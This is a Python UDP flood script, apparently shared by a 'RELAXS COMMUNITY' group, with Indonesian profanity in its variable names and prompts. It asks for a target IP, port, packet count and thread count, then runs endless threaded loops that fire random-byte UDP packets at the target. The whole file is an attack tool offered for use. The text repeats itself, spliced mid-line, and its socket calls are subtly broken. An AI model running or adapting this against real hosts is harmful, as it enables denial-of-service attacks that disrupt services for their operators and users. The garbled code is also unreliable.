import random
import socket
import threading
import os,sys
import time

os.system("clear")
print("NO DONATE NO RESPON KYBARIN")

kanjut1 = str(input("IP NYA DECK  : "))
kanjut2 = int(input("PORT NYA DECK  : "))
kanjut3 = int(input("PAKET NYA DECK : "))
kanjut4 = int(input("THREAD NYA DECK : "))
def jancok():
    turu = random._urandom(900)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("ATTACK BY RELAXS COMMUNITY")
        except:
            print("DOWN KONTOL!!!")

def jancok2():
    turu = random._urandom(919)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("ATTACK BY RELAXS COMMUNITY")
        except:
            print("DOWN KONTOL!!!")

def jancok3():
    turu = random._urandom(800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("ATTACK BY RELAXS COMMUNITY")
        except:
            print("DOWN KONTOL!!!")
            
for y in range(kanjut4):
    th = threading.Thread(target=jancok)
    th.start()
    th = threading.Thread(target=jancok2)
    th.start()
    th = threading.Thread(target=jancok3)
    th.startimport random
import socket
import threading
import os,sys
import time

os.system("clear")
print("NO DONATE NO RESPON KYBARIN")

kanjut1 = str(input("IP NYA DECK  : "))
kanjut2 = int(input("PORT NYA DECK  : "))
kanjut3 = int(input("PAKET NYA DECK : "))
kanjut4 = int(input("THREAD NYA DECK : "))
def jancok():
    turu = random._urandom(900)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("ATTACK BY RELAXS COMMUNITY")
        except:
            print("DOWN KONTOL!!!")

def jancok2():
    turu = random._urandom(919)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("ATTACK BY RELAXS COMMUNITY")
        except:
            print("DOWN KONTOL!!!")

def jancok3():
    turu = random._urandom(800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("ATTACK BY RELAXS COMMUNITY")
        except:
            print("DOWN KONTOL!!!")
            
for y in range(kanjut4):
    th = threading.Thread(target=jancok)
    th.start()
    th = threading.Thread(target=jancok2)
    th.start()
    th = threading.Thread(target=jancok3)
    th.start()